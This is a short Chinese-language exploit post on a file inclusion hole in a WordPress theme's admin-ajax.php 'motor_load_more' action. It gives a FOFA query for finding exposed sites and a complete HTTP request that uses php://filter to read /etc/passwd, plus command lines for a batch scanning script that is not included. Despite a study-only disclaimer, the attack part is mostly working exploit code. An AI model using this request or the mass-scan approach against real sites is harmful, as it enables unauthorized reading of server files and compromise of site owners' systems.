# wordpress admin-ajax.php文件包含漏洞

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa语法

body="wp-content/themes/motor""

POC:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: multipart/form-data;boundary=--------1699260943
Content-Length: 250

----------1699260943Content-Disposition: form-data; name="action"motor_load_more----------1699260943
Content-Disposition: form-data;name="file"

php://filter/resource=/etc/passwd#这里整不整编码看你，text找匹配内容
----------1699260943--
```





批量poc(记得安装库)

python poc.py -u 



python poc.py -f  .txt

